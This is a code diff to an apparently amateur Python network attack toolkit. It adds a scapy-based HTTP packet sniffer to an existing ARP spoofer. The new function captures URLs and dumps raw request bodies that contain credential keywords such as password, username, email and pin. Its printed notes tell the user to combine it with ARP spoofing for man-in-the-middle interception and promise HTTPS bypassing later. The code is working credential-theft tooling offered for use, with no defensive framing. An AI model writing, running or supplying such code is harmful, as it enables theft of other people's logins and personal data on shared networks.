@@ -11,6 +11,7 @@ import smtplib
 import re
 import scapy.all as scapy
 import time
+import scapy_http.http as http
 def encryption_fernet():
     decrpt_or_encrpt = input('do you want to decrypt or encrypt the file(e/d):')
     if decrpt_or_encrpt == 'e':
@@ -148,6 +149,7 @@ def arp_spoof():
     sent_packets = 0
     target_ip = input('enter target ip:')
     router_ip= input('enter router ip:')
+    print(Fore.LIGHTBLUE_EX," note:use packet sniffer with it for intercepting and viwing all packets")
     def get_mac(ip):
         mac = "xx"
         try:
@@ -181,6 +183,32 @@ def arp_spoof():
         restore(target_ip, router_ip)
         restore(router_ip, target_ip)
         print(Fore.LIGHTRED_EX,'\n[-] detected CTRL + C... EXITING')
+
+
+
+def packet_sniffer():
+    print(Fore.LIGHTBLUE_EX,"NOTE:while used without a mitm(man in the middle attack) running, this will only scan packets from your device, use with arpspoofer(in this tool set) for good results")
+    print(Fore.RED, 'NOTE: THIS IS FOR HTTP SITES ONLY, AND SCANS ONLY HTTP LAYERS,will add https bypassing soon')
+    print(Fore.GREEN, '-')
+    interface = input("enter the interface you want to sniff:")
+    print(Fore.LIGHTMAGENTA_EX, '-')
+    def process_packet(packet):
+        if packet.haslayer(http.HTTPRequest):
+    
+            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+            print('url -->',str(url))
+    
+            if packet.haslayer(scapy.Raw):
+                load = packet[scapy.Raw].load
+                keyword = ["email", "password", 'unames', "username", "pass", 'passcode', 'pin', ' phno', 'phone']
+                for i in keyword:
+                    if i.encode() in load:
+                        print(Fore.GREEN, '-')
+                        print('username/password -->',load) 
+                        print(Fore.MAGENTA, '-')
+
+    scapy.sniff(iface=interface, store=False, prn=process_packet)
+ 
 try:
     while True:
         print(Fore.LIGHTYELLOW_EX, '-------------------------------------')
@@ -191,7 +219,7 @@ try:
         print(Fore.LIGHTGREEN_EX, '5.mac changer')
         print(Fore.LIGHTGREEN_EX,'6. network scanner')
         print(Fore.LIGHTGREEN_EX, '7. arp spoofer')
-        print(Fore.YELLOW, ' NOTE: RECOMENDED TO USE A 3RD PARTY PACKET SNIFFER, (packet sniffer added in next update)')
+        print(Fore.LIGHTGREEN_EX, '8.packet sniffer')
         print(Fore.LIGHTRED_EX,'input exit to exit')
         print(Fore.LIGHTGREEN_EX,'-')
         
@@ -210,6 +238,8 @@ try:
             network_scanner()
         elif inpt == "7":
             arp_spoof()
+        elif inpt == '8':
+            packet_sniffer()
         elif inpt == 'exit':
             print(Fore.LIGHTRED_EX, 'cya!')
             break
@@ -217,4 +247,3 @@ try:
             print(Fore.LIGHTRED_EX, 'error')
 except KeyboardInterrupt:
     print(Fore.LIGHTRED_EX,'\nCTRL +C  detected... exiting')
-    subprocess.call('clear', shell = True)
